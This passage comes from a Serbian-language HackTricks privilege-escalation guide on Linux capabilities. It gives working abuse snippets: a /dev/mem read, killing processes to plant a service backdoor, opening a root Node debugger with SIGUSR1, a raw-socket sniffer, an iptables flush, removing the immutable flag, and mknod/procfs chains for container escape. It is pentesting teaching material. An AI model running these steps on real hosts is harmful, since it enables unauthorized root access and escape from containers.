Ako je `/dev/mem` odobreni interfejs, u privremenom laboratorijskom okruženju može se demonstrirati otkrivanje memorije čvora preko granica čitanjem i heširanjem opsega izabranog na osnovu hardverske mape tog okruženja:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Ne pogađajte opseg: čitanje nekih MMIO regiona može imati neželjene efekte, a adresa koja je ispravna na jednoj platformi može na drugoj da upravlja hardverom ili memorijom kernela. Izmena memorije kernela ili upravljanje uređajem zahtevaju odobren dokaz prilagođen konkretnoj platformi; ne postoji univerzalan primer bezbednog direktnog upisa.

## CAP_KILL

**Ova capability zaobilazi provere dozvola za slanje signala procesima u slučajevima koje definiše kernel**.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Pretpostavimo da binarna datoteka **`python`** ima ovu capability. Ako biste mogli i da **izmenite konfiguraciju nekog servisa ili socketa** (ili bilo koju konfiguracionu datoteku povezanu sa servisom), mogli biste da ubacite backdoor, zatim prekinete proces povezan sa tim servisom i sačekate da se izvrši nova konfiguraciona datoteka koja sadrži vaš backdoor.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc with kill**

Ako imate kill capabilities i postoji **node program koji se pokreće kao root** (ili kao drugi korisnik), verovatno biste mogli da mu **pošaljete** signal **SIGUSR1** i naterate ga da **otvori node debugger** na koji možete da se povežete.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Ova capability dozvoljava vezivanje za Internet portove ispod 1024.** Ne omogućava direktno šire podizanje privilegija.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Ako **`python`** ima ovu capability, moći će da osluškuje na bilo kom portu, pa čak i da se povezuje sa njega na bilo koji drugi port (neke usluge zahtevaju veze sa portova sa određenim privilegijama)

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava procesima da **kreiraju RAW i PACKET sockets**, što im omogućava da generišu i šalju proizvoljne mrežne pakete. To može dovesti do bezbednosnih rizika u kontejnerskim okruženjima, kao što su lažiranje paketa, ubacivanje saobraćaja i zaobilaženje kontrola mrežnog pristupa. Zlonamerni akteri mogli bi to da iskoriste za ometanje rutiranja kontejnera ili ugrožavanje bezbednosti mreže hosta, naročito bez odgovarajuće zaštite firewall-om. Pored toga, **CAP_NET_RAW** podržava operacije poput ping-a putem RAW ICMP zahteva.<sup>[[14]](#references)</sup>

**Ovo može omogućiti hvatanje paketa pomoću odgovarajućeg socket interfejsa.** Ne daje direktno šira ovlašćenja za eskalaciju privilegija.<sup>[[14]](#references)</sup>

Za putanju do izlaganja akreditiva, takođe potvrdite da trenutni nalog može da izvrši alat za hvatanje sa efektivnim capabilities, da relevantni saobraćaj prolazi kroz interfejs vidljiv u njegovom network namespace-u i da se podaci za autentifikaciju šalju u čistom tekstu. Na primer, HTTP Basic akreditivi poslati preko nešifrovanog HTTP-a mogu se videti na loopback interfejsu ako alat za hvatanje može da mu pristupi. Prelazak na drugi nalog zahteva i da uhvaćeni akreditivi važe za drugi identitet; file capability ili vidljiv zahtev za prijavu sami po sebi ne potvrđuju ponovnu upotrebu lozinke.

Na bežičnom hostu, izvršni WPS audit alat kao što je `reaver` sa efektivnim `CAP_NET_RAW`, uz AP i interfejs u monitor režimu vidljiv preko `iw dev`, predstavlja još jedan pokazatelj za proveru. **To ne dokazuje da je eskalacija privilegija moguća:** AP mora da omogućava WPS PIN autentifikaciju bez efektivne blokade pokušaja, mora biti dostupan preko bežičnog interfejsa i mora otkriti PSK; privilegije hosta menjaju se samo ako se taj PSK ponovo koristi za neki nalog. Pasivno nabrajanje treba da prikazuje režime i mogućnosti interfejsa, a ne da šalje probe ili isprobava PIN-ove. Pogledajte [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) za slabost WPS PIN-a i [Reaver's project documentation](https://github.com/shift/reaver-wps) za opis ponašanja alata.

**Primer sa binarnom datotekom**

Ako binarna datoteka **`tcpdump`** ima ovu capability, moći ćete da je koristite za hvatanje mrežnih informacija.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Ako **environment** dodeljuje ovu capability, **`tcpdump`** može da je koristi za sniffovanje saobraćaja.<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom 2**

Sledeći primer je kod u **`python2`** koji može biti koristan za presretanje saobraćaja na interfejsu "**lo**" (**localhost**). Kod je iz laba "_The Basics: CAP-NET_BIND + NET_RAW_" na [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) daje svom nosiocu mogućnost da **menja mrežne konfiguracije**, uključujući podešavanja firewall-a, tabele rutiranja, dozvole za socket-e i podešavanja mrežnih interfejsa u trenutnom mrežnom namespace-u. Može i da omogući promiscuous mode na interfejsu u tom namespace-u; to može da izloži saobraćaj koji stiže do tog interfejsa, ali samo po sebi ne omogućava prisluškivanje proizvoljnih interfejsa u drugim mrežnim namespace-ovima.<sup>[[14]](#references)</sup>

Ove operacije utiču na **trenutni mrežni namespace** procesa. Za kontrolu mrežnog stanja hosta potreban je `--network=host`, Kubernetes `hostNetwork: true` ili poseban mehanizam za ulazak u namespace. Sam `CAP_NET_RAW` nije generički shell na hostu, ali je učestvovao u dokumentovanom, protokol-specifičnom bekstvu: istorijski GCE lanac kombinovao je root, host mrežni namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, nešifrovan metadata saobraćaj i zahtev guest-agent-a podložan race condition-u, kako bi ubacio SSH ključ. Pogledajte [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) za sve preduslove i napomene o savremenim HTTPS metadata ograničenjima.

**Primer sa binarnom datotekom**

Pretpostavimo da **python binary** ima ove capabilities.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Ova capability omogućava menjanje inode zastavica, kao što su immutable i append-only. Ne daje direktno šira prava za eskalaciju privilegija.**<sup>[[14]](#references)</sup>

**Primer sa binarnom datotekom**

Ako otkrijete da je datoteka immutable i da python ima ovu capability, možete **ukloniti atribut immutable i omogućiti menjanje datoteke:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Operacije `FS_IOC_GETFLAGS` i `FS_IOC_SETFLAGS` čitaju i ažuriraju inode zastavice; `FS_IMMUTABLE_FL` je zastavica nepromenljivosti koju ovaj primer uklanja.<sup>[[27]](#references)</sup>

> [!TIP]
> Imajte na umu da se ovaj atribut nepromenljivosti obično postavlja i uklanja pomoću:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje sistemskog poziva `chroot(2)`, koji može omogućiti bekstvo iz slabo konstruisanog `chroot(2)` zatvora pomoću poznatih tehnika.<sup>[[11]](#references)[[14]](#references)</sup>

Ovo je **mogućnost za bekstvo iz chroot zatvora, a ne samostalno bekstvo iz containera na host**. Ona ne izlaže fajl sistem hosta niti zaobilazi njegove dozvole. Ako je korenski direktorijum hosta već montiran ili dostupan preko `/proc/<pid>/root`, `chroot()` samo postavlja to postojeće stablo kao koren putanja procesa. Odvojeno od toga, promena mount namespace-a pomoću `setns(2)` zahteva i `CAP_SYS_CHROOT` i `CAP_SYS_ADMIN` u korisničkom namespace-u pozivaoca, kao i `CAP_SYS_ADMIN` u korisničkom namespace-u koji poseduje ciljni mount namespace.<sup>[[14]](#references)</sup>

- [Kako izaći iz različitih chroot rešenja](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: alatka za bekstvo iz chroot-a](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje sistemskog poziva `reboot(2)` za ponovno pokretanje sistema, uključujući komande kao što je `LINUX_REBOOT_CMD_RESTART2`; takođe omogućava `kexec_load(2)` i, od Linuxa 3.17, `kexec_file_load(2)` za učitavanje novih crash kernela, odnosno crash kernela sa potpisom.<sup>[[14]](#references)</sup>

Unutar privatnog PID namespace-a, podržan zahtev za `reboot()` završava init proces tog namespace-a umesto da ponovo pokrene host. Uticaj na ponovno pokretanje hosta zato zahteva početni PID namespace, obično putem deljenja PID-ova hosta. Preuzimanje zasnovano na kexec-u dodatno zahteva kompatibilnu sliku, dostupan syscall i permisivnu politiku zaključavanja i potpisa. Nemojte pokretati nijednu od ovih operacija na hostu koji se deli sa drugima samo da biste proverili ovu mogućnost:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) je izdvojen iz šireg **CAP_SYS_ADMIN** u Linuxu 2.6.37, čime je konkretno omogućeno korišćenje poziva `syslog(2)`. Ova capability omogućava pregled kernel adresa preko `/proc` i sličnih interfejsa kada je podešavanje `kptr_restrict` postavljeno na 1, čime se kontroliše izlaganje kernel adresa. Od Linuxa 2.6.39, podrazumevana vrednost za `kptr_restrict` je 0, što znači da su kernel adrese izložene, mada mnoge distribucije iz bezbednosnih razloga postavljaju ovu vrednost na 1 (sakrij adrese od svih osim uid 0) ili 2 (uvek sakrij adrese).<sup>[[14]](#references)</sup>

Pored toga, **CAP_SYSLOG** omogućava pristup `dmesg` izlazu kada je `dmesg_restrict` postavljeno na 1. Uprkos ovim promenama, **CAP_SYS_ADMIN** zadržava mogućnost obavljanja `syslog` operacija zbog istorijskih razloga.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proširuje funkcionalnost sistemskog poziva `mknod` tako da, pored običnih datoteka, FIFO-a (imenovanih cevi) ili UNIX domain soketa, može da kreira i posebne datoteke, uključujući:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Specijalne znakovne datoteke, odnosno uređaji poput terminala.
- **S_IFBLK**: Specijalne blokovske datoteke, odnosno uređaji poput diskova.

Ova capability je korisna za procese koji treba da kreiraju datoteke uređaja, uključujući znakovne ili blokovske uređaje.<sup>[[14]](#references)</sup>

Uključena je u dokumentovani podrazumevani skup capabilities za Docker; proverite stvarnu konfiguraciju okruženja za izvršavanje umesto da pretpostavljate da svaka implementacija koristi iste podrazumevane vrednosti ([Moby lista podrazumevanih capabilities](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Za container escape, `CAP_MKNOD` može da kreira nedostajuću referencu na stvarni host uređaj, ali **ne** kreira sam uređaj i **ne** zaobilazi device cgroup. Potreban je kompletan niz sledećih uslova:

1. Efektivni `CAP_MKNOD` u početnom korisničkom namespace-u, jer kreiranje uređaja nije namespaced.
2. Ispravan tip blokovskog ili znakovnog uređaja i major/minor brojevi stvarnog host uređaja.
3. Dozvola device cgroup-a za otvaranje tog uređaja.
4. Čitač kompatibilan sa filesystem-om ili `CAP_SYS_ADMIN` za montiranje blokovskog filesystem-a.
5. Dozvole filesystem-a i LSM-a za kreiranje i korišćenje čvora uređaja.

Za laboratorijski blokovski uređaj ext porodice, čiji su stvarni major/minor brojevi `252:1`, validacija samo za čitanje je:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Zamenite brojeve onima koje prijavljuje `/sys/class/block/<device>/dev`. Ako kreiranje čvora uspe, ali njegovo otvaranje vrati `Operation not permitted`, pristup i dalje blokira device cgroup. Ovo je uobičajen ishod u kontejneru koji ima samo Docker-ov podrazumevani `CAP_MKNOD`, bez eksplicitno dozvoljenog uređaja.

Postoji i zasebna tehnika **lokalnog podizanja privilegija koja zahteva dva uporišta**, koju ne treba mešati sa direktnim pristupom uređaju iz kontejnera. Root proces u kontejneru koji deli početni korisnički namespace može da kreira čvor blok-uređaja, dok neprivilegovana shell sesija na hostu sa odgovarajućim UID-om otvara taj čvor putem `/proc/<container-pid>/root`. Otvaranje se zatim proverava u cgroup-u shell sesije na hostu, pa zabrana u device cgroup-u kontejnera više ne štiti uređaj.<sup>[[7]](#references)</sup>

Unutar kontejnera kreirajte čvor i ostavite pokrenut proces sa UID-om postojećeg uporišta na hostu:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Iz postojeće shell sesije na hostu sa tim UID-om identifikujte PID procesa kontejnera koji miruje i koristite njegov procfs root kao putanju do uređaja:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Ovaj lanac zahteva oba početna pristupa, korisnički namespace sa mapiranjem identiteta ili zajednički korisnički namespace, dozvolu za pristup putanji do `/proc/<pid>/root`, stvarni uređaj sa ispravnim major/minor brojevima i spoljašnji cgroup koji dozvoljava otvaranje. `hidepid`, pravila za ptrace pristup, LSM, nekompatibilnost sistema datoteka ili remapiranje korisničkog namespace-a mogu da ga onemoguće. Istorijska tehnika je vredna upravo zato što objašnjava kako `/proc/<pid>/root` može da zaobiđe ograničenje *cgroup-a za uređaje u kontejneru*; ona ne tvrdi da `CAP_MKNOD` sam po sebi omogućava bekstvo iz uobičajeno izolovanog kontejnera.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Na aktuelnim Linux kernelima koji podržavaju capabilities datoteka, **`CAP_SETPCAP`** omogućava niti da doda capabilities iz svog bounding seta u inheritable set, ukloni capabilities iz svog bounding seta i promeni svoje securebits. Ne omogućava procesu da proizvoljno dodeljuje capabilities drugom procesu; takvo ponašanje važi samo za kernele pre verzije 2.6.25 koji ne podržavaju capabilities datoteka.<sup>[[14]](#references)</sup>

Sistemski poziv `capset()` može da podesi sopstvene effective, permitted i inheritable setove niti, ali novi permitted set ne može da sadrži capabilities izvan postojećeg permitted seta, a izmene inheritable seta i dalje podležu ograničenjima kernela.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - laboratorijske vežbe za eskalaciju privilegija pomoću Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - eskalacija privilegija u Linuxu](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Osnove Linux kontejnera: capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Iskorišćavanje Linux capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Prekomerne capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Zloupotreba pristupa mount namespace-ovima preko /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux capabilities: zašto postoje i kako funkcionišu](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Razumevanje capabilities u Linuxu](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC za zaobilaženje seccomp-a ako je ptrace dozvoljen](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Kako izaći iz različitih chroot rešenja](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - originalni Docker exploit za bekstvo pomoću CAP_DAC_READ_SEARCH, autora Sebastiana Krahmera](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analiza Docker exploita za bekstvo](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu stranica priručnika](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Pokretanje kontejnera - Docker dokumentacija](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker dokumentacija](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - stranica priručnika za Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
